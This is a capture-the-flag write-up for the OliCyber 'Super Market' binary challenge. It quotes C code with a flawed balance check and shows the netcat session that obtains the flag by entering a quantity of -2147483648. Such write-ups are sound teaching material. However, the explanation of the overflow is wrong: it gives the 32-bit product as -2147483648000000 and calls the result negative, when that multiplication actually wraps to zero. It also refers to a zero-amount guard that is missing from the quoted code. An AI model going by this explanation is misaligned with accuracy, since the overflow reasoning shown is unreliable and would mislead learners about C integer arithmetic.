# Super Market

**Competition:** OliCyber<br>
**Category:** Binary<br>
**Service:** `nc market.challs.olicyber.it 10005`

---

## Description

> I want to become this supermarket's customer of the month, can you help me?

A C binary is provided that simulates a supermarket. The catalog contains three products, including a `flag` priced at €1,000,000, while the starting balance is only €10. The goal is to buy it.

---

## Code analysis

The binary defines a `Product` struct with a function pointer `foo`:

```c
typedef struct {
    char name[64];
    int price;
    void (*foo)();
} Product;
```

The catalog contains three products, each with its associated function:

```c
Product ps[] = {
    {"Penna rossa",            1,       pennaRossa},
    {"Pasticciotto alla crema",3,       pasticciotto},
    {"flag",                   1000000, flag}
};
```

The `flag()` function reads and prints the `flag` file from disk. The balance check is:

```c
cost = ps[choice-1].price * amount;

if(cost >= saldo){
    puts("Ci hai provato, mi dispiace!");
    exit(1);
}
else{
    saldo -= cost;
    ps[choice-1].foo();
}
```

---

## Solution

### Step 1 — Vulnerability identification: integer overflow / signed multiplication

The variable `amount` is declared as a 32-bit signed `int`, whose range is:

$$[-2^{31},\ 2^{31}-1] = [-2147483648,\ 2147483647]$$

The cost is computed as:

```c
cost = price * amount;
```

If `amount` is negative then `cost` is negative. The check `cost >= saldo` becomes false for negative `cost`, so the program enters the `else` branch and calls `flag()`.

### Step 2 — Choose input

The code only checks `amount == 0` as a guard, which does not exclude negative values. Choose the minimum representable integer:

```text
amount = -2^31 = -2147483648
```

The computed cost for the flag (price = 1,000,000) is:

```
cost = 1000000 * (-2147483648) = -2147483648000000
```

This is less than the balance (10), so the check `cost >= saldo` is false and `flag()` is executed.

---

## Interaction

```
nc market.challs.olicyber.it 10005

cosa vuoi comprare?
> 3
Quante ne vuoi comprare?
> -2147483648
```

**Output:**
```
flag{...}
```

---

## Flag

```
flag{...}
```

---

## Conclusions

Validating only that `amount != 0` is insufficient: signed integers allow negative values, and multiplying a positive price by a negative quantity yields a negative cost.

Two key observations:

1. **Integer overflow and signed arithmetic:** in C the `int` type is a 32-bit signed integer. The product `1000000 * (-2147483648)` overflows and its behavior is undefined according to the C standard, but on common x86/x86-64 implementations it results in a negative value that bypasses the check. The correct fix is to validate `amount > 0` before computing the cost.

2. **Function pointer as an exploitation primitive:** the `Product` struct contains a function pointer `foo`. In more advanced exploitation scenarios (heap overflow, use-after-free) overwriting a function pointer is a classic technique to redirect execution to arbitrary code; here `flag()` is already present in the binary (a ret2win). Although pointer overwrite wasn't necessary for this challenge, the presence of the pointer hints at that attack surface.
